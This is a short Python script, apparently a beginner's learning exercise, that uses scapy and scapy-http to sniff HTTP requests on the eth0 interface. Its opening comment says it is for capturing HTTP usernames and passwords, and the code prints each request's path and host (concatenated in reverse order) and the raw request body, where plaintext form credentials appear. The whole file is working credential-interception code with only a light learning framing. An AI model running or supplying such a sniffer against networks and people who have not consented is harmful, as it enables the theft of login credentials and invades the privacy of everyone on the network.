# This is a beginning script for a packet sniffer only for HTTP username and password purposes
# IMPORTANT NOTE: This can be a good start on understanding SCAPY at a protocol level which covers both networking and Python
# Here the packet has different layers, in HTTP -> HTTP-REQUEST is a layer, RAW data is aa SCAPY-LAYER
# pip install scapy-http (HTTP filter is not inbuilt in SCAPY, this is a 3rd party library)
import scapy.all as scapy
from scapy.layers import http
import re
def sniffer(interface):
        scapy.sniff(store=False, iface=interface, prn=sniffed_packet)
def sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
                url = packet[http.HTTPRequest].Path + packet[http.HTTPRequest].Host
                print(url)

                if packet.haslayer(scapy.Raw):
                        print(packet[scapy.Raw].load.decode())


sniffer("eth0")


